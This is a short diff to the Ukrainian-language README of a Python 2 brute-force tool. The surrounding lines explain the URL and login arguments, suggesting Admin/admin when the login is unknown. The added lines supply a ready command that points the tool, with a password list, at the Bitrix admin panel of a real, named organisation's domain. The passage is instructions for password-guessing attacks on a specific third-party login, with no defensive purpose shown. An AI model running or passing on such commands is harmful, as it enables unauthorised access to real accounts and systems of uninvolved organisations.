@@ -31,3 +31,7 @@ python2 brute -url -login pass.txt
 ```
 -url = Посилання на панель<br>
 -login = Логін (якщо відомо , якщо ні вставляємо Admin/admin)<br>
+Приклади готової команди <br>
+```shell
+python2 brute https://id.sechenov.ru/bitrix/admin Admin pass.txt
+```
